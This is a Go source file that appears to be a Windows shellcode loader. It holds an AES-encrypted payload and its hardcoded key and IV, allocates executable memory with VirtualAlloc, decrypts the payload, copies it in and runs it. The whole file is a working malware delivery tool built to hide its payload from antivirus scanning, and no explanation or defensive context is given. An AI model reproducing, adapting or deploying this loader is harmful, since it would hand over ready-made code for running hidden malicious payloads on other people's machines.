package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"syscall"
	"unsafe"
)

func aesDecrypt(ciphertext, key, iv []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("aes.NewCipher failed:", err)
		return nil
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(ciphertext, ciphertext)
	return ciphertext
}

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var shellcode = []byte{0xAE, 0x21, 0x71, 0xB3, 0x0A, 0x93, 0xAA, 0x0E, 0x32, 0x40, 0x39, 0x8D, 0x34, 0x23, 0x88, 0xC7, 0x42, 0xD0, 0x00, 0xB5, 0xC7, 0xA3, 0xAB, 0x80, 0x75, 0xB6, 0xD5, 0x7E, 0xA1, 0x88, 0xFF, 0x31, 0xF7, 0x90, 0x04, 0x77, 0x03, 0xB4, 0x60, 0x95, 0x6E, 0xA3, 0x59, 0x5D, 0x3A, 0x93, 0xEB, 0x72, 0x35, 0x78, 0x25, 0x21, 0x1E, 0x11, 0x0D, 0xDD, 0x23, 0xBD, 0xB3, 0xEA, 0xEE, 0xC0, 0x22, 0x21, 0xAA, 0x66, 0xF4, 0xC5, 0x50, 0x00, 0x9B, 0x6B, 0x26, 0x79, 0xE2, 0x9E, 0x68, 0x8F, 0x4F, 0x3B, 0xEF, 0xDD, 0xCA, 0xA9, 0x47, 0x47, 0x78, 0x10, 0x58, 0xD5, 0x33, 0x91, 0x68, 0xA9, 0xFD, 0x54, 0x18, 0x96, 0x4D, 0xE7, 0x11, 0x0E, 0xB7, 0x27, 0x29, 0xD5, 0x7A, 0x8E, 0x73, 0xBE, 0x29, 0xAE, 0x8B, 0x11, 0xBA, 0x84, 0x01, 0xB1, 0xBE, 0xF5, 0xEB, 0x92, 0x10, 0xCC, 0x67, 0x25, 0xDD, 0x16, 0xBB, 0x98, 0xC5, 0x22, 0x21, 0x97, 0xA4, 0x21, 0x42, 0xC4, 0x33, 0x66, 0x5D, 0xD2, 0x30, 0xBD, 0xBE, 0x00, 0xFD, 0x96, 0x21, 0xA1, 0xC8, 0x3C, 0x7D, 0xBF, 0x01, 0x9C, 0x03, 0xDA, 0x61, 0x6F, 0xC0, 0x99, 0x68, 0xB2, 0x55, 0x66, 0x05, 0xB5, 0x67, 0x03, 0x77, 0x3F, 0xC9, 0xB5, 0xE3, 0x15, 0x3D, 0x7E, 0xF1, 0xFF, 0xBE, 0x6F, 0xE1, 0x19, 0x14, 0xC2, 0x0A, 0xF1, 0xB6, 0x37, 0xDA, 0xD0, 0xD5, 0x63, 0x59, 0x4D, 0x04, 0x37, 0x74, 0xAE, 0xC7, 0xFF, 0x96, 0xBB, 0x19, 0x2E, 0x7F, 0x6D, 0xF6, 0xB6, 0x74, 0xFF, 0x24, 0xBD, 0xCB, 0x83, 0x08, 0xA8, 0x0B, 0x05, 0x32, 0xA5, 0xF4, 0x96, 0xF3, 0x0F, 0xBA, 0xBC, 0xE6, 0x77, 0x44, 0x21, 0x88, 0xE7, 0x77, 0x09, 0x74, 0xDA, 0x59, 0x58, 0x1F, 0x3D, 0x3E, 0x14, 0x25, 0xC4, 0xE4, 0x57, 0xAB, 0x61, 0xDA, 0xAF, 0x72, 0x7D, 0xC2, 0x6D, 0x95, 0xB2, 0x86, 0xE3, 0x3D, 0x29, 0x2B, 0x0A, 0x9E, 0xB2, 0xE4, 0x8E, 0x5F, 0x0B, 0x07, 0x0B, 0x8D, 0xA9, 0x96, 0xC5, 0xEC, 0x9A, 0x47, 0x3C, 0x83, 0x0E, 0x06, 0x32, 0xA5, 0xE1, 0xC7, 0x91, 0x8C, 0x32, 0xC7, 0x6D, 0xA1, 0xF5, 0xBD, 0xC3, 0x23, 0x55, 0xF6, 0x25, 0xC2, 0xD2, 0xF9, 0x95, 0x35, 0xE4, 0x5F, 0xF1, 0x44, 0x80, 0x8D, 0x5D, 0xFA, 0x72, 0xCB, 0x7B, 0x88, 0xA1, 0x68, 0xE2, 0xDA, 0x87, 0x39, 0xA0, 0x87, 0xB6, 0x36, 0xD5, 0x8F, 0xA1, 0x45, 0xF2, 0xEE, 0x3F, 0x2C, 0x6A, 0x82, 0xEA, 0x2D, 0xAF, 0x7D, 0x0A, 0x45, 0x1D, 0x03, 0xDA, 0xB9, 0x8D, 0xF1, 0x24, 0x6A, 0x14, 0xE0, 0x27, 0x11, 0xFE, 0x69, 0x5D, 0xFB, 0x61, 0x3A, 0x97, 0xEC, 0x6B, 0xEE, 0xE8, 0xE8, 0x95, 0xD5, 0x8C, 0x42, 0x44, 0x45, 0x5E, 0x3C, 0x03, 0x01, 0x11, 0xAE, 0x10, 0xC4, 0x11, 0x18, 0xF1, 0x5B, 0x58, 0xDE, 0xC7, 0xAF, 0x12, 0x40, 0x6B, 0x5A, 0x49, 0xE1, 0x1F, 0x7F, 0x25, 0xE0, 0xE5, 0x7F, 0xE1, 0x82, 0xF5, 0x10, 0x06, 0xA5, 0xD9, 0xD0, 0x9F, 0xCA, 0x72, 0x74, 0x36, 0xD6, 0x19, 0xBB, 0x98, 0x23, 0x51, 0x58, 0x51, 0xBA, 0x31, 0x63, 0xAB, 0xD9, 0xAE, 0xA6, 0xD2, 0x8D, 0xB3, 0xA0, 0x7A, 0x9A, 0x5F, 0xE5, 0x73, 0x45, 0x2D, 0x8D, 0x6E, 0x36, 0x2A, 0x47, 0x81, 0x16, 0x47, 0xA6, 0xE0, 0xF4, 0x7E, 0xD9, 0xE0, 0xFB, 0x6F, 0x3C, 0x2A, 0x11, 0xAC, 0x9D, 0xBA, 0x55, 0x01, 0x04, 0x4E, 0x76, 0xC1, 0xB5, 0x2E, 0xF3, 0xC8, 0x6F, 0x0C, 0xC2, 0x09, 0x5E, 0x22, 0x9D, 0xC7, 0x92, 0x09, 0x66, 0x2D, 0x43, 0x24, 0x64, 0x2E, 0x3B, 0xAC, 0x83, 0x7C, 0xA7, 0xC3, 0xE0, 0xF5, 0x77, 0xA1, 0xCB, 0xE5, 0xB6, 0x73, 0x63, 0x47, 0xDC, 0x80, 0x11, 0x11, 0x77, 0xEC, 0x57, 0xFB, 0xFD, 0x58, 0xAF, 0xC0, 0xAB, 0x7E, 0xE0, 0x45, 0x7F, 0x38, 0x2A, 0x1D, 0x90, 0xE4, 0xED, 0xE6, 0xA7, 0x59, 0xB7, 0xC1, 0xE2, 0xC4, 0xE1, 0xBB, 0x00, 0x60, 0x1D, 0x77, 0x22, 0x07, 0xA8, 0x42, 0xAB, 0x10, 0x7F, 0x5F, 0xD0, 0xB0, 0x8B, 0x66, 0xD8, 0xCA, 0x06, 0xBC, 0x88, 0x5A, 0x18, 0x50, 0x95, 0x04, 0xFA, 0x57, 0x87, 0xE5, 0xD4, 0x9B, 0x7A, 0xF1, 0xB6, 0xFA, 0x6B, 0x20, 0x07, 0x3A, 0xBF, 0xD9, 0xB8, 0x3E, 0xC6, 0xE0, 0x4B, 0x21, 0xF5, 0x3C, 0x51, 0x7A, 0x7B, 0x8B, 0xDF, 0xF7, 0x44, 0x9A, 0x04, 0x16, 0xEF, 0x48, 0xFC, 0x3F, 0xBA, 0x44, 0xDB, 0x34, 0x17, 0xFC, 0x19, 0x4C, 0x33, 0xBA, 0x75, 0x3D, 0x38, 0xA8, 0x4D, 0xAF, 0xA5, 0x58, 0x3F, 0x11, 0x14, 0x23, 0xCE, 0xA8, 0xA2, 0x61, 0x5C, 0x6B, 0xA5, 0xC3, 0xD9, 0x27, 0xDC, 0x86, 0xB1, 0xF0, 0x73, 0x5D, 0x65, 0x3B, 0x68, 0xB3, 0x8D, 0x1D, 0xB6, 0x5E, 0xF0, 0xDC, 0x0A, 0x60, 0x9B, 0xFA, 0xD4, 0xA1, 0x2B, 0x2C, 0x0F, 0x7F, 0x0C, 0x4B, 0x18, 0x18, 0x93, 0xFB, 0xE8, 0x26, 0xB4, 0x20, 0xB2, 0x70, 0x96, 0x88, 0x84, 0x1E, 0x93, 0x21, 0x9A, 0x9D, 0x61, 0x62, 0x72, 0x04, 0xA2, 0xDE, 0xBC, 0x61, 0xE0, 0xAD, 0x05, 0x3D, 0x9A, 0x4D, 0xB0, 0x35, 0x8E, 0x21, 0x4B, 0xB2, 0x82, 0x60, 0x33, 0x87, 0xF0, 0x17, 0x94, 0x98, 0x35, 0x5E, 0x71, 0x2D, 0xB4, 0x6A, 0xCA, 0x91, 0xD9, 0x24, 0x30, 0xC3, 0x34, 0x17}

func main() {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := ntdll.NewProc("RtlMoveMemory")
	key := []byte{0x28, 0x4A, 0x5D, 0xE8, 0x6B, 0x28, 0x12, 0x20, 0x01, 0xF2, 0x54, 0xBF, 0x3A, 0x46, 0x98, 0x73, 0xDB, 0x68, 0x62, 0xC4, 0x1F, 0x38, 0x65, 0xA6, 0xFB, 0x61, 0xEB, 0x4A, 0xA6, 0xD4, 0x77, 0x3A}
	iv := []byte{0x77, 0xF4, 0x22, 0xD8, 0x69, 0x4A, 0xDD, 0xB1, 0xF7, 0x90, 0x76, 0xE0, 0xBF, 0x7E, 0x1C, 0xE5}

	addr, _, err := virtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		fmt.Println("VirtualAlloc failed:", err)
		return
	}

	shellcode = aesDecrypt(shellcode, key, iv)

	_, _, err = rtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		fmt.Println("RtlMoveMemory failed:", err)
		return
	}

	syscall.SyscallN(addr, 0, 0, 0, 0)
}
